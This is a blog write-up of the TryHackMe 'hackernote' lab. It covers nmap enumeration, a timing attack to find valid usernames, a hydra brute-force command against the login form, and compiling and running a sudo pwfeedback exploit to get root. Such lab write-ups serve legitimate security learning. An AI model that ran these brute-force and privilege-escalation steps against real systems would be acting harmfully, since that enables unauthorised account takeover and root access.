@@ -1,0 +1,287 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="author" content="nair0lf32 ">
+<meta name="description" content="hackernote A nice room that try to be realistic about web exploitation
+Enumeration rustscan &#43; nmap PORT STATE SERVICE REASON VERSION22/tcp open ssh syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 2048 10:a6:95:34:62:b0:56:2a:38:15:77:58:f4:f3:6c:ac (RSA)| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC0njoI1MTN18O8&#43;mhh7M4EpPVA2&#43;5B3OsOtfyhpjYadmUYmS1LgxRSCAyUNFP3iKM7vmqbC9KalD6hUSWmorDoPCzgTuLPf6784OURkFZeZMmC3Cw3Qmdu348Vf2kvM0EAXJmcZG3Y6fspIsNgye6eZkVNHZ1m4qyvJ&#43;/b6WLD0fqA1yQgKhvLKqIAedsni0Qs8HtJDkAIvySCigaqGJVONPbXc2/z2g5io&#43;Tv3/wC/2YTNzP5DyDYI9wL2k2A9dAeaaG51z6z02l6F1zGzFwiwrFP&#43;fopEjhQUa99f3saIgoq3aPOJ/QufS1SiZc6AqeD8RJ/6HWz10timm5A&#43;n4J| 256 6f:18:27:a4:e7:21:9d:4e:6d:55:b3:ac:c5:2d:d5:d3 (ECDSA)| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBHKcOFLvSTrwsitMygOlMRDEZIfujX3UEXx9cLfrmkYnn0dHtHsmkcUUMc1YrwaZlDeORnJE5Z/NAH70GaidO2s=| 256 2d:c3:1b:58:4d:c3:5d:8e:6a:f6:37:9d:ca:ad:20:7c (ED25519)|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGFFNuuI7oo&#43;OdJaPnUbVa1hN/rtLQalzQ1vkgWKsF9z80/tcp open http syn-ack Golang net/http server (Go-IPFS json-rpc or InfluxDB API)|_http-title: Home - hackerNote| http-methods: |_ Supported Methods: GET HEAD POST OPTIONS8080/tcp open http syn-ack Golang net/http server (Go-IPFS json-rpc or InfluxDB API)| http-methods: |_ Supported Methods: GET HEAD POST OPTIONS|_http-title: Home - hackerNote|_http-open-proxy: Proxy might be redirecting requestsService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Oh wow!" />
+<meta name="keywords" content="" />
+<meta name="robots" content="noodp" />
+<meta name="theme-color" content="" />
+<link rel="canonical" href="https://nair0lf32.github.io/zer0ne/writeups/tryhackme/hackernote/hackernote/" />
+
+
+    <title>
+        
+             :: Zer0ne  — welcome friend
+        
+    </title>
+
+
+
+<link href="https://cdnjs.cloudflare.com/ajax/libs/flag-icon-css/3.5.0/css/flag-icon.min.css" rel="stylesheet"
+    type="text/css">
+
+
+
+<link rel="stylesheet" href="https://nair0lf32.github.io/zer0ne/main.4e5c639214707eff609bb55fe49e183dee42258a73bc90e4cc7b0a84f900798a.css">
+
+
+
+    <link rel="apple-touch-icon" sizes="180x180" href="https://nair0lf32.github.io/zer0ne/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="https://nair0lf32.github.io/zer0ne/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="https://nair0lf32.github.io/zer0ne/favicon-16x16.png">
+    <link rel="manifest" href="https://nair0lf32.github.io/zer0ne/site.webmanifest">
+    <link rel="mask-icon" href="https://nair0lf32.github.io/zer0ne/safari-pinned-tab.svg" color="">
+    <link rel="shortcut icon" href="https://nair0lf32.github.io/zer0ne/favicon.ico">
+    <meta name="msapplication-TileColor" content="">
+
+
+<meta itemprop="name" content="">
+<meta itemprop="description" content="hackernote A nice room that try to be realistic about web exploitation
+Enumeration rustscan &#43; nmap PORT STATE SERVICE REASON VERSION22/tcp open ssh syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 2048 10:a6:95:34:62:b0:56:2a:38:15:77:58:f4:f3:6c:ac (RSA)| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC0njoI1MTN18O8&#43;mhh7M4EpPVA2&#43;5B3OsOtfyhpjYadmUYmS1LgxRSCAyUNFP3iKM7vmqbC9KalD6hUSWmorDoPCzgTuLPf6784OURkFZeZMmC3Cw3Qmdu348Vf2kvM0EAXJmcZG3Y6fspIsNgye6eZkVNHZ1m4qyvJ&#43;/b6WLD0fqA1yQgKhvLKqIAedsni0Qs8HtJDkAIvySCigaqGJVONPbXc2/z2g5io&#43;Tv3/wC/2YTNzP5DyDYI9wL2k2A9dAeaaG51z6z02l6F1zGzFwiwrFP&#43;fopEjhQUa99f3saIgoq3aPOJ/QufS1SiZc6AqeD8RJ/6HWz10timm5A&#43;n4J| 256 6f:18:27:a4:e7:21:9d:4e:6d:55:b3:ac:c5:2d:d5:d3 (ECDSA)| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBHKcOFLvSTrwsitMygOlMRDEZIfujX3UEXx9cLfrmkYnn0dHtHsmkcUUMc1YrwaZlDeORnJE5Z/NAH70GaidO2s=| 256 2d:c3:1b:58:4d:c3:5d:8e:6a:f6:37:9d:ca:ad:20:7c (ED25519)|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGFFNuuI7oo&#43;OdJaPnUbVa1hN/rtLQalzQ1vkgWKsF9z80/tcp open http syn-ack Golang net/http server (Go-IPFS json-rpc or InfluxDB API)|_http-title: Home - hackerNote| http-methods: |_ Supported Methods: GET HEAD POST OPTIONS8080/tcp open http syn-ack Golang net/http server (Go-IPFS json-rpc or InfluxDB API)| http-methods: |_ Supported Methods: GET HEAD POST OPTIONS|_http-title: Home - hackerNote|_http-open-proxy: Proxy might be redirecting requestsService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Oh wow!">
+
+<meta itemprop="wordCount" content="657"><meta itemprop="image" content="https://nair0lf32.github.io/zer0ne"/>
+<meta itemprop="keywords" content="" />
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://nair0lf32.github.io/zer0ne"/>
+
+<meta name="twitter:title" content=""/>
+<meta name="twitter:description" content="hackernote A nice room that try to be realistic about web exploitation
+Enumeration rustscan &#43; nmap PORT STATE SERVICE REASON VERSION22/tcp open ssh syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 2048 10:a6:95:34:62:b0:56:2a:38:15:77:58:f4:f3:6c:ac (RSA)| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC0njoI1MTN18O8&#43;mhh7M4EpPVA2&#43;5B3OsOtfyhpjYadmUYmS1LgxRSCAyUNFP3iKM7vmqbC9KalD6hUSWmorDoPCzgTuLPf6784OURkFZeZMmC3Cw3Qmdu348Vf2kvM0EAXJmcZG3Y6fspIsNgye6eZkVNHZ1m4qyvJ&#43;/b6WLD0fqA1yQgKhvLKqIAedsni0Qs8HtJDkAIvySCigaqGJVONPbXc2/z2g5io&#43;Tv3/wC/2YTNzP5DyDYI9wL2k2A9dAeaaG51z6z02l6F1zGzFwiwrFP&#43;fopEjhQUa99f3saIgoq3aPOJ/QufS1SiZc6AqeD8RJ/6HWz10timm5A&#43;n4J| 256 6f:18:27:a4:e7:21:9d:4e:6d:55:b3:ac:c5:2d:d5:d3 (ECDSA)| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBHKcOFLvSTrwsitMygOlMRDEZIfujX3UEXx9cLfrmkYnn0dHtHsmkcUUMc1YrwaZlDeORnJE5Z/NAH70GaidO2s=| 256 2d:c3:1b:58:4d:c3:5d:8e:6a:f6:37:9d:ca:ad:20:7c (ED25519)|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGFFNuuI7oo&#43;OdJaPnUbVa1hN/rtLQalzQ1vkgWKsF9z80/tcp open http syn-ack Golang net/http server (Go-IPFS json-rpc or InfluxDB API)|_http-title: Home - hackerNote| http-methods: |_ Supported Methods: GET HEAD POST OPTIONS8080/tcp open http syn-ack Golang net/http server (Go-IPFS json-rpc or InfluxDB API)| http-methods: |_ Supported Methods: GET HEAD POST OPTIONS|_http-title: Home - hackerNote|_http-open-proxy: Proxy might be redirecting requestsService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Oh wow!"/>
+
+
+
+    <meta property="og:title" content="" />
+<meta property="og:description" content="hackernote A nice room that try to be realistic about web exploitation
+Enumeration rustscan &#43; nmap PORT STATE SERVICE REASON VERSION22/tcp open ssh syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 2048 10:a6:95:34:62:b0:56:2a:38:15:77:58:f4:f3:6c:ac (RSA)| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC0njoI1MTN18O8&#43;mhh7M4EpPVA2&#43;5B3OsOtfyhpjYadmUYmS1LgxRSCAyUNFP3iKM7vmqbC9KalD6hUSWmorDoPCzgTuLPf6784OURkFZeZMmC3Cw3Qmdu348Vf2kvM0EAXJmcZG3Y6fspIsNgye6eZkVNHZ1m4qyvJ&#43;/b6WLD0fqA1yQgKhvLKqIAedsni0Qs8HtJDkAIvySCigaqGJVONPbXc2/z2g5io&#43;Tv3/wC/2YTNzP5DyDYI9wL2k2A9dAeaaG51z6z02l6F1zGzFwiwrFP&#43;fopEjhQUa99f3saIgoq3aPOJ/QufS1SiZc6AqeD8RJ/6HWz10timm5A&#43;n4J| 256 6f:18:27:a4:e7:21:9d:4e:6d:55:b3:ac:c5:2d:d5:d3 (ECDSA)| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBHKcOFLvSTrwsitMygOlMRDEZIfujX3UEXx9cLfrmkYnn0dHtHsmkcUUMc1YrwaZlDeORnJE5Z/NAH70GaidO2s=| 256 2d:c3:1b:58:4d:c3:5d:8e:6a:f6:37:9d:ca:ad:20:7c (ED25519)|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGFFNuuI7oo&#43;OdJaPnUbVa1hN/rtLQalzQ1vkgWKsF9z80/tcp open http syn-ack Golang net/http server (Go-IPFS json-rpc or InfluxDB API)|_http-title: Home - hackerNote| http-methods: |_ Supported Methods: GET HEAD POST OPTIONS8080/tcp open http syn-ack Golang net/http server (Go-IPFS json-rpc or InfluxDB API)| http-methods: |_ Supported Methods: GET HEAD POST OPTIONS|_http-title: Home - hackerNote|_http-open-proxy: Proxy might be redirecting requestsService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Oh wow!" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://nair0lf32.github.io/zer0ne/writeups/tryhackme/hackernote/hackernote/" /><meta property="og:image" content="https://nair0lf32.github.io/zer0ne"/><meta property="article:section" content="writeups" />
+
+<meta property="og:site_name" content="Zer0ne" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+    </head>
+
+    
+        <body>
+    
+    
+        <div class="container">
+            <header class="header">
+    <span class="header__inner">
+        <a href="https://nair0lf32.github.io/zer0ne/" style="text-decoration: none;">
+    <div class="logo">
+        
+            <span class="logo__mark">&gt;</span>
+            <span class="logo__text">Zer0ne #</span>
+            <span class="logo__cursor" style=
+                  "
+                   background-color:#0FF00D;
+                   animation-duration:2s;">
+            </span>
+        
+    </div>
+</a>
+
+
+        <span class="header__right">
+            
+                <nav class="menu">
+    <ul class="menu__inner"><li><a href="https://nair0lf32.github.io/zer0ne/about">About</a></li><li><a href="https://nair0lf32.github.io/zer0ne/posts">Blog</a></li><li><a href="https://nair0lf32.github.io/zer0ne/writeups">Writeups</a></li>
+    </ul>
+</nav>
+
+                <span class="menu-trigger">
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+                        <path d="M0 0h24v24H0z" fill="none"/>
+                        <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
+                    </svg>
+                </span>
+            
+                <span class="theme-toggle not-selectable"><svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
+   <path d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
+   3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
+   13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"/>
+ </svg></span>
+        </span>
+    </span>
+</header>
+
+
+            <div class="content">
+                
+    <main class="post">
+
+        <div class="post-info">
+            
+            </p>
+        </div>
+
+        <article>
+            <h2 class="post-title"><a href="https://nair0lf32.github.io/zer0ne/writeups/tryhackme/hackernote/hackernote/"></a></h2>
+
+            
+            
+            
+
+            <div class="post-content">
+                <h1 id="hackernote">hackernote</h1>
+<!-- raw HTML omitted -->
+<p>A nice room that try to be realistic about web exploitation</p>
+<h2 id="enumeration">Enumeration</h2>
+<h3 id="rustscan--nmap">rustscan + nmap</h3>
+<pre tabindex="0"><code>PORT     STATE SERVICE REASON  VERSION
+22/tcp   open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 10:a6:95:34:62:b0:56:2a:38:15:77:58:f4:f3:6c:ac (RSA)
+| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC0njoI1MTN18O8+mhh7M4EpPVA2+5B3OsOtfyhpjYadmUYmS1LgxRSCAyUNFP3iKM7vmqbC9KalD6hUSWmorDoPCzgTuLPf6784OURkFZeZMmC3Cw3Qmdu348Vf2kvM0EAXJmcZG3Y6fspIsNgye6eZkVNHZ1m4qyvJ+/b6WLD0fqA1yQgKhvLKqIAedsni0Qs8HtJDkAIvySCigaqGJVONPbXc2/z2g5io+Tv3/wC/2YTNzP5DyDYI9wL2k2A9dAeaaG51z6z02l6F1zGzFwiwrFP+fopEjhQUa99f3saIgoq3aPOJ/QufS1SiZc6AqeD8RJ/6HWz10timm5A+n4J
+|   256 6f:18:27:a4:e7:21:9d:4e:6d:55:b3:ac:c5:2d:d5:d3 (ECDSA)
+| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBHKcOFLvSTrwsitMygOlMRDEZIfujX3UEXx9cLfrmkYnn0dHtHsmkcUUMc1YrwaZlDeORnJE5Z/NAH70GaidO2s=
+|   256 2d:c3:1b:58:4d:c3:5d:8e:6a:f6:37:9d:ca:ad:20:7c (ED25519)
+|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGFFNuuI7oo+OdJaPnUbVa1hN/rtLQalzQ1vkgWKsF9z
+
+80/tcp   open  http    syn-ack Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
+|_http-title: Home - hackerNote
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+
+8080/tcp open  http    syn-ack Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-title: Home - hackerNote
+|_http-open-proxy: Proxy might be redirecting requests
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</code></pre><p>Oh wow! A <code>Go</code> server! You don&rsquo;t always get those!</p>
+<p>For the investigation we made a simple account and started looking around</p>
+<p>For the user enumeration the <code>password reset</code> can be used but let&rsquo;s focus on the main thing</p>
+<p>Introduction to <code>timing attack</code>:</p>
+<p>As valid passwords seem to take a bit more time (hashing and processing) for a legitimate user, than wrong user&rsquo;s</p>
+<p>We just make requests for multiple users (bruteforce)</p>
+<p>And compare the times taken for every requests</p>
+<p>The longest times (let&rsquo;s say more than 1 second, or any tolerable margin) are probably valid users</p>
+<p>Obviously as we are not savages we will automate this with a script!</p>
+<p>I chose the <code>python</code> exploit, as I am more comfortable with python</p>
+<p>(Still Learning Golang)</p>
+<p>It took me maaaad long time (for python is so fast)</p>
+<p>pro tips: you can also filter the names.txt list as you know the username lenght</p>
+<p><code>└──╼ $awk 'length($1) == 5 { print $1 }' names.txt &gt; reduced.txt</code></p>
+<p>Adapt the time delay correctly 1s should be enough (slow internet, so I had to filter out false-positives to get the right user)</p>
+<p>anyway here we go!</p>
+<pre tabindex="0"><code>└──╼ $python3 exploit.py
+Making requests ... 
+Requests sent!
+Time delta:  31.63563323020935  seconds
+[REDACTED] is probably valid!
+</code></pre><p>I redacted the user, because you have to suffer too</p>
+<p>Now for the password attack we need a &ldquo;custom&rdquo; wordlist from the hint!</p>
+<p>Get the suggested combinator and get a new wordlist</p>
+<pre tabindex="0"><code>└──╼ $./combinator.bin colors.txt numbers.txt &gt; custom_wordlist.txt 
+</code></pre><p>Then use that good ol&rsquo; hydra (or your favorite login forms bruteforcer)</p>
+<pre tabindex="0"><code>└──╼ $hydra -l [username goes here] -P custom_wordlist.txt 10.10.88.143 http-post-form &#34;/api/user/login:username=^USER^&amp;password=^PASS^:Invalid Username Or Password&#34;
+
+Hydra v9.1 (c) 2020 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-04-04 01:08:53
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 180 login tries (l:1/p:180), ~12 tries per task
+[DATA] attacking http-post-form://10.10.88.143:80/api/user/login:username=^USER^&amp;password=^PASS^:Invalid Username Or Password
+[STATUS] 48.00 tries/min, 48 tries in 00:01h, 132 to do in 00:03h, 16 active
+[80][http-post-form] host: 10.10.88.143   login: [username]   password: [REDACTED BOIII]
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-04-04 01:10:12
+</code></pre><p>Now we got access! login and grab ssh access too, then get in!</p>
+<pre tabindex="0"><code>user@hackernote:~$ cat user.txt
+thm{real_flag_for_free_no_tricks}
+</code></pre><h2 id="privilege-escalation">Privilege escalation</h2>
+<p>Remember <code>pwdfeedback</code> ? no? google it!</p>
+<p>you are even provided the exploit already, so let&rsquo;s just escalate bro</p>
+<pre tabindex="0"><code>└──╼ $gcc pwfeedback.c -o exploit
+
+└──╼ $scp ./exploit user@10.10.88.143:/home/user 
+user@10.10.88.143&#39;s password: 
+exploit 
+</code></pre><p>Now witness magic</p>
+<pre tabindex="0"><code>user@hackernote:~$ ./exploit
+[sudo] password for user: 
+Sorry, try again.
+# id
+uid=0(root) gid=0(root) groups=0(root),1001(user)
+
+# cat root.txt
+thm{true_root_flag_this_time_i_sweaar}
+</code></pre><h2 id="comments-on-realism">Comments on realism:</h2>
+<blockquote>
+<p>This room was designed to be more realistic and less CTF focused. The logic behind the timing attack is mentioned in OWASP&rsquo;s authentication section, and a fairly similar timing attack existed on OpenSSH, allowing username enumeration</p>
+</blockquote>
+<blockquote>
+<p>The privilege escalation for this box is a real world CVE vulnerability, and affected the default configurations of sudo on macOS, Linux Mint and ElementaryOS</p>
+</blockquote>
+<p>I did that room mostly to see how realist it could go and practice password cracking</p>
+<p>was not disappointed but I think this is not always real-life applicable</p>
+<p>Anyway, that room was just great!</p>
+
+            </div>
+        </article>
+
+        <hr />
+
+        <div class="post-info">
+            
+            
+  		</div>
+    </main>
+
+            </div>
+
+            
+                <footer class="footer">
+    
+    <div class="footer__inner">
+        <div class="footer__content">
+            <span>&copy; 2022</span>
+            <span><a href="https://nair0lf32.github.io/zer0ne">nair0lf32</a></span>
+            <span><a href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank" rel="noopener">CC BY-NC 4.0</a></span>
+            <span><a href="https://nair0lf32.github.io/zer0ne/posts/index.xml" target="_blank" title="rss"><svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 20 20" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-rss"><path d="M4 11a9 9 0 0 1 9 9"></path><path d="M4 4a16 16 0 0 1 16 16"></path><circle cx="5" cy="19" r="1"></circle></svg></a></span>
+            
+        </div>
+    </div>
+    
+    
+    <div class="footer__inner">
+        <div class="footer__content">
+            <span>Powered by <a href="https://gohugo.io/">Hugo</a></span><span>Made with &#10084; by <a href="https://github.com/nair0lf32">nair0lf32</a></span><span>Theme used: <a href="https://github.com/rhazdon/hugo-theme-hello-friend-ng">Hello-friend-ng</a></span>
+        </div>
+    </div>
+    
+</footer>
+
+            
+        </div>
+
+        
+
+
+
+<script type="text/javascript" src="https://nair0lf32.github.io/zer0ne/bundle.min.cf7fb2a9e24608a783e05e4472da2fdf008293289de1ad88d1cba5c143e7e414496dd33b6a228e92f8461ce0c8cbad3c9f9847e73e46dfbce0463393ddd1733a.js" integrity="sha512-z3&#43;yqeJGCKeD4F5Ectov3wCCkyid4a2I0culwUPn5BRJbdM7aiKOkvhGHODIy608n5hH5z5G37zgRjOT3dFzOg=="></script>
+
+
+
+    </body>
+</html>
